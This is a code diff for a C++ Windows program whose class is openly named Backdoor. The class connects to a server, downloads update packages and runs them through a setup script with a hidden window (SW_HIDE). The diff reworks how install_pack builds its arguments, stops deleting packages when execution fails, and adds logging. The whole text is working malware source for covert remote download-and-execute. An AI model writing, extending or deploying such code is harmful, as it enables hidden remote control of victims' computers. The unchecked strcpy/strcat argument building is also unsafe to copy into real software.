@@ -80,18 +80,33 @@ bool Backdoor::dwnl_file(char * file_path) const
 	return false;
 }
 
-void Backdoor::install_pack(const char * file_path) const
+void Backdoor::install_pack(const char * file_path, bool using_tmpdir) const
 {
 	if (file_path == NULL)
 		return;
-	char * args = new char[MAX_PATH];
+	char * args = new char[MAX_PATH * 2];
+
 	strcpy(args, "\"");
 	strcat(args, file_path);
 	strcat(args, "\"");
+
+	if (!using_tmpdir)
+	{
+		strcat(args, " \"");
+		strcat(args, root_dir);
+		strcat(args, "\"");
+	}
+
 	export_setup_script();
-	HINSTANCE hinst = ShellExecuteA(NULL, "open", script_file_path, args, root_dir, SW_HIDE);
-	if ((int)hinst <= 32)
-		DeleteFileA(file_path);
+	HINSTANCE hinst = ShellExecuteA(NULL, "open", script_file_path, args, NULL, SW_HIDE);
+	if ((int)hinst > 32)
+	{
+		LOG_I("Executed script!");
+	}
+	else
+	{
+		LOG_E("Can not execute script");
+	}
 	delete[] args;
 }
 
@@ -197,12 +212,14 @@ bool Backdoor::check_and_dwnl_update()
 
 void Backdoor::install_update_pack()
 {
-	install_pack(upd_pck_path);
+	install_pack(upd_pck_path, false);
 }
 
 Backdoor::Backdoor(const char * server_addr, int server_port, const char * working_dir, const char * root_dir)
 	:Comm(server_addr, server_port)
 {
+	LOG_I("Backdoor working dir: %s", working_dir);
+	LOG_I("Backdoor root dir: %s", root_dir);
 	this->working_dir = strdup(working_dir);
 	this->root_dir = strdup(root_dir);
 	this->script_file_path = new char[MAX_PATH];
